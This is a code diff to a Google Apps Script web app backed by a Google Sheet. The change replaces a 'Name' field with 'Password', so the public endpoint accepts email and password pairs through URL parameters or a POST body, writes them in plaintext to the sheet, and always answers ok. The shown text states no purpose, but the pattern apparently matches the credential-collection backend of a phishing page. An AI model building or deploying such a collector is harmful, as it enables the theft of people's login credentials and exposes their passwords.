@@ -3,7 +3,7 @@
  *
  * SETUP:
  * 1. Create a Google Sheet (or use an existing one).
- * 2. Add a header row in row 1, e.g.: Timestamp | Email | Name
+ * 2. Add a header row in row 1, e.g.: Timestamp | Email | Password
  * 3. In the Sheet: Extensions → Apps Script. Paste this entire file.
  * 4. Save, then Deploy → New deployment → type "Web app".
  *    - Execute as: Me
@@ -16,15 +16,17 @@ function doGet(e) {
   e = e || {};
   var p = e.parameter || {};
   var email = p.email || "";
-  var name = p.name || "";
+  var password = p.password || "";
   var time = p.time || new Date().toISOString();
-  if (email || name) {
+  if (email || password) {
     try {
       var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
       if (sheet.getLastRow() === 0) {
-        sheet.appendRow(["Timestamp", "Email", "Name"]);
+        sheet.appendRow(["Timestamp", "Email", "Password"]);
+      } else if (sheet.getLastColumn() < 3) {
+        sheet.getRange(1, 3).setValue("Password");
       }
-      sheet.appendRow([time, email, name]);
+      sheet.appendRow([time, email, password]);
     } catch (err) {}
   }
   return ContentService.createTextOutput(JSON.stringify({ ok: true }))
@@ -38,14 +40,16 @@ function doPost(e) {
     if (e && e.postData && e.postData.contents) {
       body = JSON.parse(e.postData.contents);
     }
-    if (body.email || body.name) {
+    if (body.email || body.password) {
       if (sheet.getLastRow() === 0) {
-        sheet.appendRow(["Timestamp", "Email", "Name"]);
+        sheet.appendRow(["Timestamp", "Email", "Password"]);
+      } else if (sheet.getLastColumn() < 3) {
+        sheet.getRange(1, 3).setValue("Password");
       }
       var row = [
         body.time || new Date().toISOString(),
         body.email || "",
-        body.name || ""
+        body.password || ""
       ];
       sheet.appendRow(row);
     }
